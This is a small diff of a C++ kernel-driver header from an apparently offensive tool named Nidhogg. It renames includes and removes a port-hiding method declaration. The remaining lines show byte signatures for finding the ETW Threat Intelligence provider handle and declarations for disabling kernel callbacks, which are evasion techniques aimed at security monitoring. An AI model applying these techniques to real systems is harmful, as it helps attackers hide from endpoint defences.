@@ -2,10 +2,10 @@
 #include "pch.h"
 
 extern "C" {
-	#include "WindowsTypes.hpp"
+	#include "WindowsTypes.h"
 	#include "NidhoggCommon.h"
 }
-#include "MemoryUtils.hpp"
+#include "MemoryUtils.h"
 
 constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = { 0x60, 0x4C, 0x8B, 0xCC };
 constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = { 0xD2, 0x48, 0x8B, 0xCC };
@@ -118,8 +118,6 @@ private:
 	NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]);
 	NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
 	NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);
-	void HidePort(PVOID entries, PNSI_PARAM nsiParameter, PNSI_STATUS_ENTRY statusEntries,
-		PNSI_PROCESS_ENTRY processEntries, SIZE_T index);
 
 public:
 	void* operator new(size_t size) {
